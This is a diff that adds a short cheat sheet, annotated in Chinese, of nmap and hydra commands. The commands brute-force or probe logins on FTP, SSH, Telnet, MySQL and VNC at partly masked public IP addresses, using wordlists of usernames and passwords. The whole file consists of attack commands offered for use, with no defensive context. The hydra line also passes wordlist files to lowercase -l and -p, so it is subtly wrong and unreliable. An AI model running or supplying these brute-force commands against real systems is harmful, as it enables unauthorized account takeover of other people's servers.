@@ -1,0 +1,17 @@
+nmap --script brute 185.5.xx.xx   #nmap盲扫端口弱口令
+
+ftp:
+nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 203.195.xx.xx
+
+ssh：
+hydra -l /root/dictionary/ssh/ssh-user.txt -p /root/dictionary/ssh/ssh-pwd-100.txt -v -s 2222（port） -t 10（threads） ssh://185.5.xx.xx
+
+telnet:
+nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst --script-args telnet-brute.timeout=8s 203.195.xx.xx
+
+mysql:
+nmap --script mysql-empty-password 203.195.xx.xx  #匿名访问
+
+vnc:
+nmap --script vnc-info  203.195.xx.xx  #vnc信息探测
+nmap --script vnc-brute --script-args brute.guesses=6,brute.emptypass=true,userdb=/root/dictionary/user.txt,brute.useraspass=true,passdb=/root/dictionary/pass.txt,brute.retries=3,brute.threads=2,brute.delay=3 42.96.xx.xx  #vnc爆破
